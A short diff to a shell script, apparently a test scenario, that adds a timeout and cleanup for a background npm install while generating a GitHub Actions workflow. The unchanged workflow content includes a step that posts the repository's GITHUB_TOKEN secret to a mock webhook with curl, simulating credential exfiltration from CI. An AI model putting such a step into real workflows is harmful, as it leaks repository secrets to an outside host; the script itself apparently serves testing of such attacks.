@@ -10,7 +10,7 @@ cd "$WORKDIR"
 git init >/dev/null 2>&1
 mkdir -p .github/workflows
 
-npm install test-package &
+timeout 10 npm install test-package >/dev/null 2>&1 &
 NPM_PID=$!
 sleep 1
 
@@ -27,6 +27,10 @@ jobs:
           curl -X POST $MOCK_WEBHOOK -d "secrets=${{ secrets.GITHUB_TOKEN }}"
 EOF
 
-wait "$NPM_PID" || true
+# Clean up background npm process if still running
+if ps -p "$NPM_PID" >/dev/null 2>&1; then
+  kill "$NPM_PID" 2>/dev/null || true
+fi
+wait "$NPM_PID" 2>/dev/null || true
 echo "Scenario 3 complete"
 
